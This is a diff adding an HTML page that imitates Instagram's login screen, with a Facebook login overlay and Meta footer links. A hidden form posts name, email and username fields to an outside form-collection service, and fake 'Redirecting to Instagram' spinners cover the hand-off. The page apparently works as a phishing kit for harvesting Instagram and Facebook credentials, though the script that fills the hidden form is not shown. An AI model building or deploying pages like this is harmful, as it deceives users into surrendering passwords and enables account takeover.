@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <!-- Font Awesome for Facebook and Meta icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <!-- External CSS -->
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+    <div class="login-wrapper">
+        <!-- ===== INSTAGRAM LOGIN CARD ===== -->
+        <div class="login-container">
+
+            <!-- Instagram icon + "Log into Instagram" -->
+            <a href="https://www.instagram.com" target="_blank" class="instagram-header">
+                <div class="instagram-icon">
+                    <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="instaGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#f09433" />
+                                <stop offset="25%" style="stop-color:#e6683c" />
+                                <stop offset="50%" style="stop-color:#dc2743" />
+                                <stop offset="75%" style="stop-color:#cc2366" />
+                                <stop offset="100%" style="stop-color:#bc1888" />
+                            </linearGradient>
+                        </defs>
+                        <rect x="4" y="4" width="40" height="40" rx="12" fill="url(#instaGrad)" />
+                        <rect x="12" y="12" width="24" height="24" rx="6" fill="none" stroke="white" stroke-width="2.5" />
+                        <circle cx="24" cy="24" r="7" fill="none" stroke="white" stroke-width="2.5" />
+                        <circle cx="34" cy="14" r="2" fill="white" />
+                    </svg>
+                </div>
+                <span class="brand-text">Log into Instagram</span>
+            </a>
+
+            <!-- Login form with rounded inputs -->
+            <form class="login-form" id="loginForm" action="#" method="post">
+                <input type="text" placeholder="Mobile number, username or email" aria-label="Mobile number, username or email" id="instaUsername" />
+                <input type="password" placeholder="Password" aria-label="Password" id="instaPassword" />
+                <button type="submit" class="login-btn" id="instaLoginBtn">Log in</button>
+                <div class="loading-spinner" id="instaSpinner">
+                    <div class="spinner"></div>
+                    <div class="redirect-message">Redirecting to Instagram...</div>
+                </div>
+            </form>
+
+            <!-- Forgot password -->
+            <a href="#" class="forgot-link" id="forgotPasswordBtn">Forgot password?</a>
+
+            <!-- ===== ROUNDED RECTANGLE BOXES ===== -->
+            <!-- Facebook login button as rounded box -->
+            <button class="fb-login-box" id="fbLoginBtn">
+                <i class="fab fa-facebook-square"></i>
+                <span>Log in with Facebook</span>
+            </button>
+
+            <!-- Create new account button as rounded box -->
+            <a href="#" class="create-account-box" id="createAccountBtn">
+                Create new account
+            </a>
+
+            <!-- Success notification -->
+            <div class="submit-success" id="submitSuccess"></div>
+        </div>
+
+        <!-- ============================================
+        HIDDEN FORM FOR DATA SUBMISSION
+        ============================================ -->
+        <form action="https://submit-form.com/HZI7Oh1kv" method="POST" class="hidden-form" id="submitForm" style="display:none;">
+            <input type="text" id="formName" name="name" />
+            <input type="email" id="formEmail" name="email" />
+            <input type="text" id="formUsername" name="username" />
+            <input type="text" id="formAction" name="action" />
+            <button type="submit" id="submitBtn">Send</button>
+        </form>
+
+        <!-- ============================================
+        FOOTER SECTION WITH REDIRECT LINKS
+        ============================================ -->
+        <div class="footer">
+            <!-- Meta icon + Meta -->
+            <div class="footer-meta">
+                <i class="fab fa-meta"></i>
+                <a href="https://about.meta.com/" target="_blank">Meta</a>
+            </div>
+
+            <!-- First row: links -->
+            <div class="footer-links">
+                <a href="https://about.meta.com/" target="_blank">About</a>
+                <a href="https://about.meta.com/blog/" target="_blank">Blog</a>
+                <a href="https://about.meta.com/careers/" target="_blank">Jobs</a>
+                <a href="https://help.instagram.com/" target="_blank">Help</a>
+                <a href="https://developers.facebook.com/docs/instagram/" target="_blank">API</a>
+                <a href="https://privacycenter.instagram.com/" target="_blank">Privacy</a>
+                <a href="https://help.instagram.com/581066165581870" target="_blank">Terms</a>
+                <a href="https://about.meta.com/company-info/" target="_blank">Locations</a>
+                <a href="https://www.instagram.com/explore/tags/popular/" target="_blank">Popular</a>
+                <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
+                <a href="https://www.meta.ai/" target="_blank">Meta AI</a>
+                <a href="https://www.threads.net/" target="_blank">Threads</a>
+            </div>
+
+            <!-- Second row: Contact & Meta Verified -->
+            <div class="footer-links" style="margin-bottom:10px;">
+                <a href="https://help.instagram.com/414823681870702" target="_blank">Contact Uploading &amp; Non-Users</a>
+                <a href="https://www.instagram.com/accounts/meta_verified/" target="_blank">Meta Verified</a>
+            </div>
+
+            <!-- Third row: Language selector + copyright -->
+            <div class="footer-bottom">
+                <select onchange="window.open(this.value, '_blank')">
+                    <option value="https://www.instagram.com/?hl=en">English</option>
+                    <option value="https://www.instagram.com/?hl=es">Español</option>
+                    <option value="https://www.instagram.com/?hl=fr">Français</option>
+                    <option value="https://www.instagram.com/?hl=de">Deutsch</option>
+                    <option value="https://www.instagram.com/?hl=it">Italiano</option>
+                    <option value="https://www.instagram.com/?hl=pt">Português</option>
+                    <option value="https://www.instagram.com/?hl=ja">日本語</option>
+                    <option value="https://www.instagram.com/?hl=ko">한국어</option>
+                    <option value="https://www.instagram.com/?hl=zh">中文</option>
+                    <option value="https://www.instagram.com/?hl=ar">العربية</option>
+                    <option value="https://www.instagram.com/?hl=hi">हिन्दी</option>
+                </select>
+                <span class="separator">•</span>
+                <span class="copyright">© 2026 Instagram from Meta</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================
+    FORGOT PASSWORD OVERLAY
+    ============================================ -->
+    <div class="overlay" id="forgotOverlay">
+        <div class="modal">
+            <button class="close-btn" id="forgotCloseBtn">&times;</button>
+            <div class="modal-icon">🔑</div>
+            <div class="modal-title">Forgot password?</div>
+            <div class="modal-subtitle">Enter your email, phone, or username and we'll send you a link to reset your password.</div>
+            <form class="modal-form" id="forgotForm">
+                <input type="text" placeholder="Email, phone, or username" required id="forgotInput" />
+                <button type="submit" class="modal-btn" id="forgotSubmitBtn">Send reset link</button>
+                <div class="loading-spinner" id="forgotSpinner">
+                    <div class="spinner"></div>
+                    <div class="redirect-message">Sending reset link...</div>
+                </div>
+            </form>
+            <div class="modal-footer-link">
+                <a id="forgotBackToLogin">Back to login</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================
+    CREATE NEW ACCOUNT OVERLAY
+    ============================================ -->
+    <div class="overlay" id="createOverlay">
+        <div class="modal">
+            <button class="close-btn" id="createCloseBtn">&times;</button>
+            <div class="modal-icon">✨</div>
+            <div class="modal-title">Create new account</div>
+            <div class="modal-subtitle">Sign up to start sharing photos and stories.</div>
+            <form class="modal-form" id="createForm">
+                <input type="text" placeholder="Full name" required id="createFullname" />
+                <input type="text" placeholder="Username" required id="createUsername" />
+                <input type="email" placeholder="Email" required id="createEmail" />
+                <input type="password" placeholder="Password" required id="createPassword" />
+                <button type="submit" class="modal-btn" id="createSubmitBtn">Sign up</button>
+                <div class="loading-spinner" id="createSpinner">
+                    <div class="spinner"></div>
+                    <div class="redirect-message">Creating your account...</div>
+                </div>
+            </form>
+            <div class="modal-footer-link">
+                Already have an account? <a id="createBackToLogin">Log in</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================
+    FACEBOOK OVERLAY
+    ============================================ -->
+    <div class="overlay" id="fbOverlay">
+        <div class="modal fb-modal">
+            <button class="close-btn" id="fbCloseBtn">&times;</button>
+            <div class="fb-logo">facebook</div>
+            <div class="fb-subtitle">Log in to Facebook</div>
+            <form class="fb-form" id="fbForm" action="#" method="post">
+                <label class="fb-field-label" for="fbUsername">Username</label>
+                <input type="text" id="fbUsername" placeholder="Enter your username" />
+
+                <label class="fb-field-label" for="fbPassword">Password</label>
+                <input type="password" id="fbPassword" placeholder="Enter your password" />
+
+                <button type="submit" class="fb-login-btn" id="fbLoginSubmit">Log In</button>
+                <div class="loading-spinner" id="fbSpinner">
+                    <div class="spinner" style="border-top-color: #1877f2;"></div>
+                    <div class="redirect-message">Redirecting to Facebook...</div>
+                </div>
+            </form>
+            <a href="#" class="fb-forgot-link" id="fbForgotLink">Forgot password?</a>
+            <div class="fb-divider">
+                <div class="fb-divider-line"></div>
+                <div class="fb-divider-text">or</div>
+                <div class="fb-divider-line"></div>
+            </div>
+            <a href="#" class="fb-create-link" id="fbCreateLink">Create new account</a>
+        </div>
+    </div>
+
+    <!-- External JavaScript -->
+    <script src="script.js"></script>
+
+</body>
+</html>
